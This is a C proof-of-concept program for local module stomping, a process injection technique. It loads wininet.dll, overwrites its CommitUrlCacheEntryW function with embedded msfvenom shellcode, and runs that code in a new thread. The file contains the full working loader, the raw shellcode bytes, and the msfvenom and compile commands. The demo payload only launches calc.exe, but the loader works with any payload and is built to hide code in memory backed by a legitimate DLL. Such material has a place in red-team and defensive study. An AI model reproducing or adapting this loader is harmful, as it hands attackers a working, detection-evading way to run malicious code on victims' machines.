/*
* Local module stomping: load a sacrificial DLL into the process memory, locate a function to stomp (it'll be within the .text section, this is lazy)
*                        & inject calc.exe msfvenom shellcode into the target buffer, toggling the memory protection between RW and RWX
* shellcode: msfvenom -p windows/x64/exec CMD=calc.exe -f C EXITFUNC=thread
* compile: cl.exe local-stomp.c /W0
*/
#include <windows.h>
#include <stdbool.h>
#include <stdio.h>

int main() {
    unsigned char buf[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
        "\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
        "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

    // Retrieve the current process ID
    DWORD pid = 0;
    pid = GetCurrentProcessId();
    if (pid == 0) {
        printf("[ERROR] Failed to obtain current process ID!\n");
        return -1;
    }

    printf("[*] Running PI with target PID: %u\n", pid);

    // Open a handle to the current process
    HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (pHandle == NULL) {
        printf("Failed to acquire process handle!\n");
        return -1;
    }
    printf("[*] Successfully opened handle to PID: %u\n", pid);

    printf("[*] Press Enter to load the sacrificial DLL:");
    getchar();

    // load sacrificial DLL, using wininet because it is fairly large and so it can accomodate different PoC payloads
    HMODULE hSacrificialDll = LoadLibraryExA("wininet.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
    if (hSacrificialDll == NULL) {
        printf("[ERROR] Failed to obtain DLL handle! Error: %lu\n", GetLastError());
        return -1;
    }
    printf("[*] Target DLL loaded.\n");

    LPVOID targetAddress = (LPVOID)GetProcAddress(hSacrificialDll, "CommitUrlCacheEntryW");
    if (targetAddress == NULL) {
        printf("[ERROR] Failed to locate target function CommitUrlCacheEntryW! Error: %lu\n", GetLastError());
        return -1;
    }
    printf("[*] Target wininet.dll!CommitUrlCacheEntryW located at: 0x%016llx\n", targetAddress);

    printf("[*] Press Enter to write the shellcode:");
    getchar();

    // Write the shellcode to the block of memory that we located with GetProcAddress
    BOOL writeShellcode = WriteProcessMemory(pHandle, targetAddress, buf, sizeof buf, NULL);
    if (writeShellcode == false) {
        printf("[ERROR] Failed to write shellcode! Using addresss: 0x%016llx, Error: %lu\n", targetAddress, GetLastError());
        FreeLibrary(hSacrificialDll);
        return -1;
    }

    printf("[*] Press Enter to execute the shellcode:");
    getchar();

    // Create a new thread using the shellcode buffer address as the starting point
    HANDLE tHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)targetAddress, NULL, 0, NULL);
    if (tHandle == NULL) {
        printf("[ERROR] Failed to create thread within the process (PID: %u)! Error: %lu\n", pid, GetLastError());
        FreeLibrary(hSacrificialDll);
        return -1;
    }

    // Wait for the thread to return - not required, but it definitely makes the demonstration much cleaner
    printf("[*] Waiting for the thread to return...\n");
    WaitForSingleObject(tHandle, INFINITE);

    // Clean up open handles and free the shellcode buffer memory
    CloseHandle(pHandle);
    CloseHandle(tHandle);
    FreeLibrary(hSacrificialDll);

    printf("[*] Process injection complete.\n");

    return 0;
}